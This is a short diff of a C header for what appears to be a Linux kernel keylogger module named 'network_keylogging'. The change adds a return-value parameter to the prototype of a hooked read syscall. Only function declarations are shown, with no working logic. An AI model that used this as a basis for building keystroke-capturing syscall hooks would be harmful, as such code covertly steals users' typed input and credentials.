@@ -29,6 +29,6 @@
 int network_keylogging_init(int);
 int network_keylogging_exit(void);
 
-asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t);
+asmlinkage long network_keylogging_read_syscall(unsigned int, char __user *, size_t, long ret);
 
 #endif
